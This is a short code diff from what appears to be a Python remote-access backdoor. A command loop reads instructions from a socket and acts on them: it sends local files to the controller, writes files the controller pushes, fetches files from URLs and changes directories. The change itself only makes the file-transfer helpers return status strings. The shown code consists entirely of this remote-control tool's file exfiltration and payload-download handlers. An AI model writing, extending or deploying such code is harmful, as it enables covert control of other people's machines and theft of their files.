@@ -21,15 +21,16 @@ def Upload(sock, file):
   f = open(file, 'rb')
   d = f.read()
   Send(sock, d, '')
+  Send(sock, '')
   f.close()
-  Send(sock, 'File sent 🍺', '')
+  return 'File sent 🍺'
 
 def Download(sock, file):
   f = open(file, 'wb')
   d = Receive(sock)
   f.write(d)
   f.close()
-  Send(sock, 'File received 🍺', '')
+  return 'File received 🍺'
 
 # download from url (unencrypted)
 def Downhttp(sock, url):
@@ -110,10 +111,10 @@ while True:
           ret = 'Error changing directory.\n'
 
       elif data.startswith('download '):
-        Upload(sock, data[9:])
+        ret = Upload(sock, data[9:])
 
       elif data.startswith('downhttp '):
-        Downhttp(sock, data[9:])
+        ret = Downhttp(sock, data[9:])
 
       elif data.startswith('upload '):
         ret = Download(sock, data[7:])
